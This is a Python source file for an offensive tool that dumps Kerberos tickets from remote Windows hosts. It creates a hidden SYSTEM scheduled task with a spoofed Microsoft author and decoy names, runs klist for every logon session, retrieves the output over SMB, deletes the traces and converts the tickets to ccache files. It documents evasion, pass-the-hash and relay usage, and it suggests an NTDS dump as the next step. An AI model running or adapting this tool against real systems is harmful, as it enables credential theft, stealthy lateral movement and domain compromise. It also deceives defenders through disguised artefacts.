#!/usr/bin/env python3
"""
titan klist — remote Kerberos ticket dump via Titanis Tsch + Smb2Client

Enumerates all logon sessions on a remote Windows host and converts each
TGT to a MIT ccache file.  Requires the Tsch binary (Titanis PR #18 /
release containing ms-tsch support).

Remote execution chain:
  Smb2Client       →  (no files staged before task creation)
  Tsch create/run  →  cmd.exe → klist.exe + findstr.exe (SYSTEM context)
  Smb2Client get   →  read C$\\ProgramData\\<decoy>.log
  Smb2Client rm    →  delete temp file
  Tsch delete      →  remove scheduled task

OPSEC notes:
  - No PowerShell.  The remote payload is cmd.exe calling klist.exe and
    findstr.exe — both Microsoft-signed Windows binaries.
  - Task XML is registered with Author=Microsoft Corporation, a plausible
    Description, Hidden=true, and a path under \\Microsoft\\Windows\\.
  - Output file uses a software-component name + hex nonce with .log ext.
  - No LSASS reads.  klist.exe calls LsaCallAuthenticationPackage
    internally; titan only collects the text output over SMB.

Session key note:
  The task runs as NT AUTHORITY\\SYSTEM so klist returns the real
  KerberosKeyWithMetadata blob.  Credential Guard hosts will still
  have VTL1-protected keys — titan klist warns about each affected
  session but still writes the ccache (ticket bytes are usable for
  inspection / offline cracking even without the session key).

Usage:
    titan klist DOMAIN/user:'password'@192.168.1.10
    titan klist -u user -d domain -p password -t 192.168.1.10
    titan klist -u user -d domain --hash <NT> -t host
    titan klist -u user -d domain -hashes <NT> -t host

  Kerberos:
    KRB5CCNAME=Administrator.ccache titan klist -k -no-pass -t host
    titan klist -k --ccache Administrator.ccache -t host
    titan klist -u user -d domain --aes-key <hex> -dc-ip dc01.domain.local -t host

  SMB relay / ntlmrelayx --socks:
    proxychains titan klist -u administrator -d DOMAIN --no-pass -t 192.168.1.10

  Output:
    titan klist -u user -d domain -p password -t host -o /path/to/loot/
"""

import argparse
import os
import re
import struct
import sys
import tempfile
import time
import random
from datetime import datetime, timezone
from xml.sax.saxutils import escape as _xml_escape

from titanlib.common import auth_args, add_auth_args, apply_target_string, validate_auth, run as _run, find_binary, make_env

TSCH_BIN = find_binary('Tsch')
SMB_BIN  = find_binary('Smb2Client')

# ── decoy name generation ─────────────────────────────────────────────────────

_TASK_FOLDERS = [
    r'\Microsoft\Windows\WS',
    r'\Microsoft\Windows\WDI',
    r'\Microsoft\Windows\Shell',
    r'\Microsoft\Windows\MUI',
    r'\Microsoft\Windows\DiskDiagnostic',
]
_TASK_VERBS = [
    'BrokerSync', 'CacheRefresh', 'DataCollect', 'EventLogSvc',
    'FeedUpdate',  'GatherInfo',  'HealthCheck',  'IndexSync',
    'JobDispatch', 'KeyRotate',   'LicenseCheck', 'MetaSync',
]
_FILE_PREFIXES = [
    'WUSvc', 'MsiTrace', 'DiagLog', 'PerfMon',
    'EventLog', 'NetTrace', 'AppLog', 'TelLog',
]
_TASK_DESCRIPTIONS = [
    'Manages Windows Modules Installer Worker operations on this device.',
    'Monitors and tracks system diagnostic data for Windows maintenance.',
    'Updates service cache data for improved system performance.',
    'Collects diagnostic information to improve Windows reliability.',
]


def _make_decoy() -> tuple:
    """Return (task_path, out_filename, sessions_filename) for one run."""
    n      = random.randint(0x1000, 0xEFFF)
    folder = random.choice(_TASK_FOLDERS)
    verb   = random.choice(_TASK_VERBS)
    prefix = random.choice(_FILE_PREFIXES)
    return (
        f'{folder}\\{verb}_{n:04x}',
        f'{prefix}_{n:04x}.log',
        f'{prefix}_{n:04x}_s.log',
    )


# ── ccache reader (key extraction from reference file) ────────────────────────

def _skip_counted(data: bytes, off: int) -> int:
    n = struct.unpack_from(">I", data, off)[0]
    return off + 4 + n


def _skip_principal(data: bytes, off: int) -> int:
    off += 4
    count = struct.unpack_from(">I", data, off)[0]
    off += 4
    off = _skip_counted(data, off)
    for _ in range(count):
        off = _skip_counted(data, off)
    return off


def read_ccache_key(path: str) -> tuple:
    """Extract (etype, key_bytes) from the first credential in a ccache file."""
    with open(path, "rb") as f:
        data = f.read()
    off = 0
    version = struct.unpack_from(">H", data, off)[0]
    off += 2
    if version not in (0x0504, 0x0503, 0x0502):
        raise ValueError(f"Unrecognised ccache version: 0x{version:04x}")
    hdr_len = struct.unpack_from(">H", data, off)[0]
    off += 2 + hdr_len
    off = _skip_principal(data, off)
    off = _skip_principal(data, off)
    off = _skip_principal(data, off)
    etype = struct.unpack_from(">H", data, off)[0]
    off += 2 + 2
    klen = struct.unpack_from(">H", data, off)[0]
    off += 2
    return etype, data[off:off + klen]


# ── klist text parser ─────────────────────────────────────────────────────────

_KEY_SIZES = {0x01: 8, 0x03: 8, 0x11: 16, 0x12: 32, 0x17: 16, 0x18: 16}


def parse_klist(text: str) -> dict:
    """Parse the output of `klist tgt [-li 0x...]` into a credential dict."""

    def field(pat: str, default: str = "") -> str:
        m = re.search(pat, text, re.IGNORECASE)
        return m.group(1).strip() if m else default

    def parse_time(s: str) -> int:
        if not s:
            return 0
        for fmt in ("%m/%d/%Y %H:%M:%S", "%m/%d/%Y %H:%M"):
            try:
                return int(
                    datetime.strptime(s.strip(), fmt)
                    .replace(tzinfo=timezone.utc)
                    .timestamp()
                )
            except ValueError:
                pass
        return 0

    ticket_hex = []
    for m in re.finditer(
        r"^[0-9a-fA-F]{4}\s+((?:[0-9a-fA-F]{2}[\s:])+)", text, re.MULTILINE
    ):
        ticket_hex.append(re.sub(r"[^0-9a-fA-F]", "", m.group(1)))
    ticket_bytes = bytes.fromhex("".join(ticket_hex))

    key_type = int(field(r"KeyType\s+(0x[0-9a-fA-F]+)", "0x12"), 16)

    raw = re.sub(
        r"\s+", "",
        field(r"KeyLength\s+\d+\s+-\s+([0-9a-fA-F][0-9a-fA-F ]*)"),
    )
    try:
        raw_bytes = bytes.fromhex(raw) if raw else b""
    except ValueError:
        raw_bytes = b""

    cred_guard = False
    key_bytes = b""
    if raw_bytes:
        if len(raw_bytes) >= 16 and struct.unpack_from("<I", raw_bytes, 0)[0] == len(raw_bytes):
            _TN = b"KerberosKeyWithMetadata"
            tn_len = struct.unpack_from("<I", raw_bytes, 8)[0]
            tn_off = struct.unpack_from("<I", raw_bytes, 12)[0]
            cred_guard = (
                tn_len == len(_TN)
                and 0 < tn_off <= len(raw_bytes) - len(_TN)
                and raw_bytes[tn_off:tn_off + len(_TN)] == _TN
            )
            if not cred_guard:
                etype_in_blob = struct.unpack_from("<I", raw_bytes, 8)[0]
                key_sz = _KEY_SIZES.get(etype_in_blob)
                if key_sz and len(raw_bytes) >= 28 + key_sz:
                    key_type = etype_in_blob
                    key_bytes = raw_bytes[28:28 + key_sz]
        if not key_bytes:
            expected = _KEY_SIZES.get(key_type, 32)
            if len(raw_bytes) == expected:
                key_bytes = raw_bytes

    if not key_bytes:
        key_bytes = b"\x00" * _KEY_SIZES.get(key_type, 32)

    return {
        "client":     field(r"ClientName\s*:\s*(.+)"),
        "realm":      field(r"DomainName\s*:\s*(.+)"),
        "sname":      [
            field(r"ServiceName\s*:\s*(.+)"),
            field(r"TargetDomainName\s*:\s*(.+)"),
        ],
        "flags":      int(field(r"Ticket Flags\s*:\s*(0x[0-9a-fA-F]+)", "0x0"), 16),
        "key_type":   key_type,
        "key_data":   key_bytes,
        "cred_guard": cred_guard,
        "auth_time":  parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "start_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "end_time":   parse_time(field(r"EndTime\s*:\s*(.+?)\s*\(local\)")),
        "renew_till": parse_time(field(r"RenewUntil\s*:\s*(.+?)\s*\(local\)")),
        "ticket_data": ticket_bytes,
    }


# ── ccache writer ─────────────────────────────────────────────────────────────

def write_ccache(info: dict, path: str) -> None:
    """Write a MIT ccache v4 file from a parsed credential dict."""

    def p16(n): return struct.pack(">H", n)
    def p32(n): return struct.pack(">I", n)
    def cnt(b): return p32(len(b)) + b

    def principal(name: str, realm: str, ntype: int = 1) -> bytes:
        parts = name.split("/") if "/" in name else [name]
        out = p32(ntype) + p32(len(parts)) + cnt(realm.encode())
        for c in parts:
            out += cnt(c.encode())
        return out

    hdr  = b"\x05\x04"
    tag  = p16(1) + p16(8) + struct.pack(">I", 0xFFFFFFFF) + p32(0)
    hdr += p16(len(tag)) + tag

    cred  = principal(info["client"], info["realm"])
    cred += principal("/".join(info["sname"]), info["realm"], 1)
    cred += p16(info["key_type"]) + p16(0)
    cred += p16(len(info["key_data"])) + info["key_data"]
    cred += struct.pack(">IIII",
        info["auth_time"], info["start_time"],
        info["end_time"],  info["renew_till"])
    cred += b"\x00"
    cred += p32(info["flags"])
    cred += p32(0) + p32(0)
    cred += cnt(info["ticket_data"])
    cred += cnt(b"")

    with open(path, "wb") as f:
        f.write(hdr + principal(info["client"], info["realm"]) + cred)


# ── remote execution helpers ──────────────────────────────────────────────────

def _tsch_auth(args) -> list:
    return auth_args(args)


def _build_cmd_args(remote_out: str, remote_sessions: str) -> str:
    """Pure cmd.exe payload — no PowerShell, no base64.

    Runs klist.exe and findstr.exe (both Microsoft-signed) to enumerate
    all logon session LUIDs and dump each TGT into the output file.
    The sessions staging file is deleted by cmd.exe after the loop.
    """
    return (
        f'/c klist sessions > "{remote_sessions}" 2>&1'
        f' & for /f "tokens=2 delims=:" %i in'
        f' (\'findstr "0:0x" "{remote_sessions}"\') do'
        f' (echo === SESSION %i === >> "{remote_out}"'
        f'  & klist tgt -li %i >> "{remote_out}" 2>&1)'
        f' & del "{remote_sessions}" 2>nul'
    )


def _build_task_xml(arguments: str) -> bytes:
    """Task XML with spoofed Author/Description and Hidden=true.
    Returns UTF-16-LE bytes with BOM — required by Windows Task Scheduler."""
    desc = random.choice(_TASK_DESCRIPTIONS)
    body = (
        '<?xml version="1.0" encoding="UTF-16"?>\n'
        '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n'
        '  <RegistrationInfo>\n'
        '    <Author>Microsoft Corporation</Author>\n'
        f'    <Description>{desc}</Description>\n'
        '  </RegistrationInfo>\n'
        '  <Settings>\n'
        '    <Hidden>true</Hidden>\n'
        '    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n'
        '    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n'
        '    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n'
        '    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>\n'
        '    <Priority>7</Priority>\n'
        '  </Settings>\n'
        '  <Triggers/>\n'
        '  <Principals>\n'
        '    <Principal id="Author">\n'
        '      <UserId>S-1-5-18</UserId>\n'
        '      <RunLevel>HighestAvailable</RunLevel>\n'
        '    </Principal>\n'
        '  </Principals>\n'
        '  <Actions Context="Author">\n'
        '    <Exec>\n'
        '      <Command>cmd.exe</Command>\n'
        f'      <Arguments>{_xml_escape(arguments)}</Arguments>\n'
        '    </Exec>\n'
        '  </Actions>\n'
        '</Task>'
    )
    return b'\xff\xfe' + body.encode('utf-16-le')


def _tsch_create(tsch_bin, task_path, arguments, target, auth_flags, verbose) -> bool:
    xml_bytes = _build_task_xml(arguments)
    with tempfile.NamedTemporaryFile(suffix='.xml', mode='wb', delete=False) as f:
        f.write(xml_bytes)
        xml_path = f.name
    try:
        extra = ['-TaskPath', task_path, '-X', xml_path, target]
        stdout, rc = _run(tsch_bin, 'create', auth_flags, extra, verbose=verbose)
    finally:
        os.unlink(xml_path)
    if rc != 0:
        print(f'  [!] Tsch create failed (rc={rc})', file=sys.stderr)
        if stdout: print(f'  [!] {stdout.strip()}', file=sys.stderr)
        return False
    return True


def _tsch_run(tsch_bin, task_path, target, auth_flags, verbose) -> bool:
    extra = ['-TaskPath', task_path, target]
    stdout, rc = _run(tsch_bin, 'run', auth_flags, extra, verbose=verbose)
    if rc != 0:
        print(f'  [!] Tsch run failed (rc={rc})', file=sys.stderr)
        if stdout: print(f'  [!] {stdout.strip()}', file=sys.stderr)
        return False
    return True


def _tsch_delete(tsch_bin, task_path, target, auth_flags, verbose):
    extra = ['-TaskPath', task_path, target]
    _run(tsch_bin, 'delete', auth_flags, extra, verbose=verbose)


def _smb_get(smb_bin, unc_path, dest_path, auth_flags, verbose) -> bool:
    extra = [unc_path, dest_path, '-Overwrite']
    stdout, rc = _run(smb_bin, 'get', auth_flags, extra, verbose=verbose)
    if rc != 0:
        print(f'  [!] Smb2Client get failed (rc={rc}): {stdout.strip()}', file=sys.stderr)
        return False
    return True


def _smb_rm(smb_bin, unc_path, auth_flags, verbose):
    _run(smb_bin, 'rm', auth_flags, [unc_path], verbose=verbose)


# ── session output splitter ───────────────────────────────────────────────────

def _split_sessions(text: str) -> list:
    """Split combined klist output into [(luid, block_text), ...]."""
    parts = re.split(r'=== SESSION (0x[0-9a-fA-F]+) ===', text, flags=re.IGNORECASE)
    sessions = []
    for i in range(1, len(parts) - 1, 2):
        luid  = parts[i].strip().lower()
        block = parts[i + 1]
        sessions.append((luid, block))
    return sessions


# ── main dump workflow ────────────────────────────────────────────────────────

def _dump(args, tsch_bin, smb_bin) -> int:
    if not tsch_bin:
        print(
            '[!] Tsch binary not found.\n'
            '    titan klist requires the Tsch tool from Titanis PR #18 or later.\n'
            '    Run install.sh after pulling a release that includes Tsch.',
            file=sys.stderr,
        )
        return 1
    if not smb_bin:
        print('[!] Smb2Client binary not found — run install.sh', file=sys.stderr)
        return 1

    target  = args.target
    out_dir = args.output or '.'
    verbose = args.verbose
    os.makedirs(out_dir, exist_ok=True)

    task_name, file_name, sessions_name = _make_decoy()
    remote_out      = f'C:\\ProgramData\\{file_name}'
    remote_sessions = f'C:\\ProgramData\\{sessions_name}'
    unc_out         = f'\\\\{target}\\C$\\ProgramData\\{file_name}'
    unc_sessions    = f'\\\\{target}\\C$\\ProgramData\\{sessions_name}'

    smb_auth  = _tsch_auth(args)
    tsch_auth = smb_auth + ['-PreferSmb', '-EncryptRpc']
    arguments = _build_cmd_args(remote_out, remote_sessions)

    print(f'[*] Target     : {target}')
    print(f'[*] Task path  : {task_name}')
    print(f'[*] Output     : {remote_out}')
    print()

    # ── create & run task ─────────────────────────────────────────────────────
    print('[*] Creating scheduled task ...')
    if not _tsch_create(tsch_bin, task_name, arguments, target, tsch_auth, verbose):
        return 1

    print('[*] Triggering task ...')
    if not _tsch_run(tsch_bin, task_name, target, tsch_auth, verbose):
        _tsch_delete(tsch_bin, task_name, target, tsch_auth, verbose)
        return 1

    # ── poll for output file (deadline-based) ─────────────────────────────────
    with tempfile.NamedTemporaryFile(suffix='.log', delete=False) as tmp:
        local_tmp = tmp.name

    print('[*] Waiting for task output ...')
    ok       = False
    deadline = time.time() + 45
    time.sleep(2)
    attempt  = 0
    while time.time() < deadline:
        attempt += 1
        if verbose:
            print(f'  [*] SMB read attempt {attempt} ...', file=sys.stderr)
        if _smb_get(smb_bin, unc_out, local_tmp, smb_auth, verbose):
            ok = True
            break
        time.sleep(3)

    # ── cleanup (best-effort) ─────────────────────────────────────────────────
    print('[*] Cleaning up ...')
    if ok:
        _smb_rm(smb_bin, unc_out, smb_auth, verbose)
    # sessions file is deleted by cmd.exe; this catches the rare case it wasn't
    _smb_rm(smb_bin, unc_sessions, smb_auth, verbose)
    _tsch_delete(tsch_bin, task_name, target, tsch_auth, verbose)

    if not ok:
        os.unlink(local_tmp)
        return 1

    # ── parse ─────────────────────────────────────────────────────────────────
    with open(local_tmp, 'r', errors='replace') as f:
        raw = f.read()
    os.unlink(local_tmp)

    if not raw.strip():
        print('[-] Remote command produced no output.', file=sys.stderr)
        return 1

    sessions = _split_sessions(raw)
    if not sessions:
        sessions = [('unknown', raw)]

    print(f'\n[*] Found {len(sessions)} logon session(s)\n')
    written = 0

    for luid, block in sessions:
        if not block.strip():
            continue

        info = parse_klist(block)

        if not info['ticket_data']:
            print(f'  [-] {luid}: no ticket bytes — skipping')
            continue

        client = info['client'] or 'unknown'
        realm  = info['realm']  or 'UNKNOWN'

        cg_warn = ''
        if info['cred_guard']:
            cg_warn = '  [!] Credential Guard — session key is VTL1-protected, zeros used'
        elif all(b == 0 for b in info['key_data']):
            cg_warn = '  [!] Session key is all-zeros — did the task run as SYSTEM?'

        slug     = re.sub(r'[^a-zA-Z0-9@._-]', '_', f'{client}@{realm}_{luid}')
        out_path = os.path.join(out_dir, f'{slug}.ccache')
        write_ccache(info, out_path)

        size = os.path.getsize(out_path)
        print(f'  [+] {luid}  {client}@{realm}')
        print(f'      key_type={info["key_type"]}  ticket={len(info["ticket_data"])}B  '
              f'→ {out_path} ({size}B)')
        if cg_warn:
            print(cg_warn)
        written += 1

    print(f'\n[*] {written} ccache file(s) written to {os.path.abspath(out_dir)}')
    if written:
        print(f'\n[*] Next steps:')
        print(f'    export KRB5CCNAME={out_path}')
        print(f'    titan dump -k -no-pass --ntds -dc-ip <dc> -t <dc>')
    return 0 if written else 1


# ── argument parser ───────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description='Dump Kerberos tickets from a remote Windows host via Tsch + Smb2Client',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    ap.add_argument('target_string', nargs='?', metavar='[[DOMAIN/]user[:pass]@]host',
                    help='impacket-style target string')
    ap.add_argument('-t', '--target', metavar='HOST')
    ap.add_argument('-o', '--output', metavar='DIR',
                    help='Output directory for ccache files (default: current dir)')
    ap.add_argument('-v', '--verbose', action='store_true')

    add_auth_args(ap)

    args = ap.parse_args()
    apply_target_string(args)
    validate_auth(args, ap)

    if not args.target:
        ap.error('target host required (-t or positional target string)')

    sys.exit(_dump(args, TSCH_BIN, SMB_BIN))


if __name__ == '__main__':
    main()
